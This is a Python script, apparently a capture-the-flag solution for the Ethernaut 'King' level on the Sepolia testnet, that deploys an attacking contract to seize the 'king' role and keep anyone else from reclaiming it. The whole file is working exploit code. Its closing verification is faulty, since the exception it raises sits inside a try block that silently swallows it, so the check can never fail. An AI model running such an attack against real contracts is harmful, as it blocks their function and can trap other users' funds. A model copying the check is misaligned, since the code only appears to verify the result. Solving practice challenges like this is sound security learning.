#!/usr/bin/python3
from ape import accounts, convert, project
from rich.console import Console

# sepolia: 0x902f8598266c868802A980cd7A2d6ffc175275a7
ADDRESS = "0x902f8598266c868802A980cd7A2d6ffc175275a7"

console = Console()


def attack():
    attacker = accounts.load("ctf")
    attacker.set_autosign(True)
    target_contract = project.King.at(ADDRESS)

    console.print(f"[green]Owner Before The Hack: [magenta]{target_contract._king()}")
    console.print("[red]Attacking Now...")
    
    prize_value = target_contract.prize()
    attacking_contract = project.KingForever.deploy(value=prize_value, sender=attacker)

    attacking_contract.overthrowKing(target_contract.address, sender=attacker)

    # assert target_contract._king() == attacker.address
    console.print(f"[green]King After The Hack: [magenta]{target_contract._king()}")

    prize_value = target_contract.prize()
    try:
        attacker.transfer(to=ADDRESS, value=prize_value, account=attacker)
        raise Exception("Still able to overthow the king!!")
    except Exception as e:
        pass


def main():
    attack()


if __name__ == "__main__":
    main()
